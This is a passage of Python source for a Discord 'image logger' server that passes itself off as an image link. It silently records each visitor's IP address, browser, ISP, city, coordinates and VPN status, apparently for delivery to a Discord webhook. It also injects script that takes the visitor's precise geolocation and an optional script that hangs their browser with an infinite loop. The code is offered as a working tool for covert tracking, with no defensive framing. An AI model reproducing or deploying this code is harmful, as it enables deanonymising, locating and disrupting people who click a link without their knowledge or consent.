            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
